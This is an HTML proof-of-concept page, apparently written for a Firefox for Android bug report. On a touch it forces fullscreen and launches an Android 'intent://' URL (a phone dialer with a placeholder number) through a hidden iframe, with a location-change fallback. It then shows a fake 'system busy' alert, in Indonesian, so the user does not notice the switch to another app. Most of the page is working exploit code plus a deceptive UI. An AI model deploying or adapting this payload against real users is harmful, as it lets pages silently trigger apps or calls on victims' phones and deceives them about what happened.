<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY_RESEARCH_INTENT</title>
    <style>
        body, html { 
            margin: 0; padding: 0; background: #000; 
            width: 100vw; height: 100vh;
        }
        #trigger {
            width: 100%; height: 100%; cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="trigger"></div>

<script>
    const trigger = document.getElementById('trigger');

    trigger.addEventListener('touchstart', function() {
        // 1. Memaksa Fullscreen untuk mengacaukan fokus UI
        document.documentElement.requestFullscreen();

        // 2. Konstruksi Intent yang berbahaya
        // Contoh: Membuka dialer dengan nomor tertentu (Sangat umum untuk report bug)
        // Atau bisa diganti dengan package lain: intent://#Intent;scheme=tel;...
        const intentUrl = "intent://123456789#Intent;scheme=tel;action=android.intent.action.DIAL;end";

        // 3. Eksekusi Intent via Iframe (Teknik klasik untuk bypass)
        // Beberapa versi Firefox Android gagal memblokir intent yang dipicu via iframe di mode fullscreen
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = intentUrl;
        document.body.appendChild(iframe);

        // 4. Cadangan: Direct Location Change
        setTimeout(() => {
            window.location.href = intentUrl;
        }, 500);

        // 5. Lockdown visual agar user tidak sadar aplikasi berpindah
        setTimeout(() => {
            alert("SISTEM SIBUK: Memproses permintaan keamanan...");
        }, 1000);
    });
</script>
</body>
</html>
